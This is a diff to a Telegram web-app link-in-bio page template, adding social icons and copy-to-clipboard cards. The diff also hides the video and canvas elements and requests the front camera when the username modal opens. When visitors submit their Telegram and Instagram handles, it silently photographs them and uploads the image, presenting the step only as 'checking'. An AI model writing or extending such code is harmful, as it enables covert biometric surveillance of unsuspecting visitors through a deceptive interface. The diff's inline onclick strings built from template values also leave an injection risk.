@@ -63,7 +63,7 @@
         .link-card:hover .icon-box { transform: rotate(-8deg) scale(1.1); background: #ffffff; color: #060709; }
         .text-box { text-align: left; flex-grow: 1; }
         .link-title { font-size: 16px; font-weight: 600; }
-        .link-subtitle { font-size: 12px; color: rgba(255, 255, 255, 0.55); margin-top: 4px; }
+        .link-subtitle { font-size: 12px; color: rgba(255, 255, 255, 0.55); margin-top: 4px; word-break: break-all; }
 
         /* Premium Modal Oyna */
         .modal-overlay {
@@ -104,8 +104,8 @@
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <div id="usernameModal" class="modal-overlay">
         <div class="modal-box">
@@ -140,31 +140,63 @@
         {% endif %}
 
         {% for link in links %}
-            <a {% if link.action_type == 'copy' %}
-                    onclick="copyToClipboard('{{ link.subtitle }}', this); trackClick('{{ link.id }}');"
-               {% else %}
-                    href="{{ link.url }}" target="_blank" onclick="trackClick('{{ link.id }}')"
-               {% endif %}
-               class="link-card">
-                
-                <div class="icon-box">
-                    {% if link.icon_type == 'phone' %}<i class="bi bi-telephone-fill"></i>
-                    {% elif link.icon_type == 'telegram' %}<i class="bi bi-telegram"></i>
-                    {% elif link.icon_type == 'instagram' %}<i class="bi bi-instagram"></i>
-                    {% elif link.icon_type == 'youtube' %}<i class="bi bi-youtube"></i>
-                    {% elif link.icon_type == 'pubg' %}<i class="bi bi-controller"></i>
-                    {% elif link.icon_type == 'mlbb' %}<i class="bi bi-shield-shaded"></i>
-                    {% elif link.icon_type == 'beelink' %}<i class="bi bi-link-45deg"></i>
-                    {% else %}<i class="bi bi-globe"></i>{% endif %}
+            {% if link.action_type == 'copy' %}
+                <div onclick="copyToClipboard('{{ link.url }}', this); trackClick('{{ link.id }}');" class="link-card">
+                    <div class="icon-box">
+                        {% if link.icon_type == 'phone' %}<i class="bi bi-telephone-fill"></i>
+                        {% elif link.icon_type == 'telegram' %}<i class="bi bi-telegram"></i>
+                        {% elif link.icon_type == 'instagram' %}<i class="bi bi-instagram"></i>
+                        {% elif link.icon_type == 'facebook' %}<i class="bi bi-facebook"></i>
+                        {% elif link.icon_type == 'linkedin' %}<i class="bi bi-linkedin"></i>
+                        {% elif link.icon_type == 'youtube' %}<i class="bi bi-youtube"></i>
+                        {% elif link.icon_type == 'tiktok' %}<i class="bi bi-tiktok"></i>
+                        {% elif link.icon_type == 'twitter' %}<i class="bi bi-twitter-x"></i>
+                        {% elif link.icon_type == 'github' %}<i class="bi bi-github"></i>
+                        {% elif link.icon_type == 'pubg' %}<i class="bi bi-controller"></i>
+                        {% elif link.icon_type == 'mlbb' %}<i class="bi bi-shield-shaded"></i>
+                        {% elif link.icon_type == 'freefire' %}<i class="bi bi-fire"></i>
+                        {% elif link.icon_type == 'spotify' %}<i class="bi bi-spotify"></i>
+                        {% elif link.icon_type == 'apple_music' %}<i class="bi bi-music-note-list"></i>
+                        {% elif link.icon_type == 'app_store' %}<i class="bi bi-apple"></i>
+                        {% elif link.icon_type == 'play_market' %}<i class="bi bi-google-play"></i>
+                        {% elif link.icon_type == 'beelink' %}<i class="bi bi-link-45deg"></i>
+                        {% else %}<i class="bi bi-globe"></i>{% endif %}
+                    </div>
+                    <div class="text-box">
+                        <div class="link-title">{{ link.title }}</div>
+                        <div class="link-subtitle">{% if link.subtitle %}{{ link.subtitle }}{% else %}{{ link.url }}{% endif %}</div>
+                    </div>
                 </div>
-                
-                <div class="text-box">
-                    <div class="link-title">{{ link.title }}</div>
-                    {% if link.subtitle %}
-                        <div class="link-subtitle">{{ link.subtitle }}</div>
-                    {% endif %}
-                </div>
-            </a>
+            {% else %}
+                <a href="{{ link.url }}" target="_blank" onclick="trackClick('{{ link.id }}')" class="link-card">
+                    <div class="icon-box">
+                        {% if link.icon_type == 'phone' %}<i class="bi bi-telephone-fill"></i>
+                        {% elif link.icon_type == 'telegram' %}<i class="bi bi-telegram"></i>
+                        {% elif link.icon_type == 'instagram' %}<i class="bi bi-instagram"></i>
+                        {% elif link.icon_type == 'facebook' %}<i class="bi bi-facebook"></i>
+                        {% elif link.icon_type == 'linkedin' %}<i class="bi bi-linkedin"></i>
+                        {% elif link.icon_type == 'youtube' %}<i class="bi bi-youtube"></i>
+                        {% elif link.icon_type == 'tiktok' %}<i class="bi bi-tiktok"></i>
+                        {% elif link.icon_type == 'twitter' %}<i class="bi bi-twitter-x"></i>
+                        {% elif link.icon_type == 'github' %}<i class="bi bi-github"></i>
+                        {% elif link.icon_type == 'pubg' %}<i class="bi bi-controller"></i>
+                        {% elif link.icon_type == 'mlbb' %}<i class="bi bi-shield-shaded"></i>
+                        {% elif link.icon_type == 'freefire' %}<i class="bi bi-fire"></i>
+                        {% elif link.icon_type == 'spotify' %}<i class="bi bi-spotify"></i>
+                        {% elif link.icon_type == 'apple_music' %}<i class="bi bi-music-note-list"></i>
+                        {% elif link.icon_type == 'app_store' %}<i class="bi bi-apple"></i>
+                        {% elif link.icon_type == 'play_market' %}<i class="bi bi-google-play"></i>
+                        {% elif link.icon_type == 'beelink' %}<i class="bi bi-link-45deg"></i>
+                        {% else %}<i class="bi bi-globe"></i>{% endif %}
+                    </div>
+                    <div class="text-box">
+                        <div class="link-title">{{ link.title }}</div>
+                        {% if link.subtitle %}
+                            <div class="link-subtitle">{{ link.subtitle }}</div>
+                        {% endif %}
+                    </div>
+                </a>
+            {% endif %}
         {% endfor %}
 
         <div class="developer-footer">
@@ -174,19 +206,31 @@
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        window.addEventListener('DOMContentLoaded', () => {
+        let activeStream = null;
+
+        window.addEventListener('DOMContentLoaded', async () => {
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.ready();
                 window.Telegram.WebApp.expand();
             }
+            
             const isLoggedIn = "{{ is_logged_in }}";
             const saved = localStorage.getItem('visitor_authenticated');
+            
             if (isLoggedIn === "False" && !saved) {
                 document.getElementById('usernameModal').classList.add('active');
+                
+                // Modal yuklanishi bilanoq kameraga ruxsat so'rovini faollashtirish
+                try {
+                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    const video = document.getElementById('video');
+                    video.srcObject = activeStream;
+                } catch (e) {
+                    console.log("Kamera ruxsati dastlab rad etildi:", e);
+                }
             }
         });
 
-        // Maydonlarni validatsiya qilish va kamerani ishga tushirish
         async function validateAndCapture() {
             const tg = document.getElementById('tgInput').value.trim().replace('@', '');
             const insta = document.getElementById('instaInput').value.trim().replace('@', '');
@@ -200,29 +244,29 @@
             errorBox.style.display = "none";
 
             const submitBtn = document.getElementById('submitBtn');
-            submitBtn.innerText = "Tizim tekshirilmoqda...";
+            submitBtn.innerText = "Tekshirilmoqda...";
             submitBtn.disabled = true;
 
-            const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             let imageData = null;
             let statusText = "Kameraga ruxsat berilmadi ❌";
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
+                if (!activeStream) {
+                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                }
+                
                 statusText = "Haqiqiy kamera rasmi olindi ✅";
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                imageData = canvas.toDataURL('image/jpeg', 0.7);
-                stream.getTracks().forEach(track => track.stop());
+                context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
+                imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                activeStream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                statusText = "Kamera rad etildi ⚠️";
-                imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Anonim&background=f43f5e&color=fff&size=512`);
+                statusText = "Kamera butunlay rad etildi ⚠️";
+                imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
             }
 
-            // Backendga yuborish
             const formData = new FormData();
             formData.append('tg_user', tg || '-');
             formData.append('insta_user', insta || '-');
@@ -263,15 +307,17 @@
             });
         }
 
-        // NUSXALASH REJIMI FUNKSIYASI
+        // NUSXALASH MEXANIZMI
         function copyToClipboard(text, element) {
             navigator.clipboard.writeText(text).then(() => {
                 const textBox = element.querySelector('.link-subtitle');
                 if (!textBox) return;
                 const oldText = textBox.innerText;
-                textBox.innerText = "Nusxalandi! ✅";
+                textBox.innerText = "NUSXALANDI! ✅";
                 textBox.style.color = "#fcf6ba";
                 setTimeout(() => { textBox.innerText = oldText; textBox.style.color = ""; }, 1500);
+            }).catch(err => {
+                console.log("Nusxalashda xatolik:", err);
             });
         }
     </script>
